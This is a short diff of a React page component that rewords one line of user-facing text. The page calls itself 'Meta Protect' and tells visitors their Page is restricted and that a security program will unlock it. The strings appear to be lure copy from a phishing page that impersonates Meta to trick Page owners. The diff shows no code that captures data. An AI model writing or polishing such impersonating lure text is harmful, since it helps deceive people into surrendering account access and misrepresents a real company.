@@ -114,7 +114,7 @@ const Index = () => {
         () => ({
             title: 'Welcome to Meta Protect.',
             description:
-                'Your access to the site is restricted, so we require that higher security requirements apply to that account. We created this security program to unlock your Pages.',
+                "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
             protectionText: "We've enabled advanced protections to unblock your Page.",
             processText: 'We will guide you through the process in detail and help you fully activate to unlock your Page.',
             restrictedText: 'Access to your page has been restricted on',
